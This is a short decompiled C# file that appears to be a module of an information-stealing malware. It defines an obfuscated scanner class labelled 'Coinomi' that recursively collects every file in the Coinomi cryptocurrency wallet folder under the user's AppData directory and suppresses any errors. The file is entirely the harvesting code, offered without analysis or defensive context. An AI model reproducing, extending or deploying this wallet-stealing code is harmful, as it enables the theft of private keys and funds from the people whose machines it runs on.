using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001F RID: 31
public class C_o1_n0_mи : FileScanner
{
	// Token: 0x060000AF RID: 175 RVA: 0x00003828 File Offset: 0x00001A28
	public C_o1_n0_mи()
	{
		base.Name = "Coinomi";
	}

	// Token: 0x060000B0 RID: 176 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000B1 RID: 177 RVA: 0x00008494 File Offset: 0x00006694
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Coinomi";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
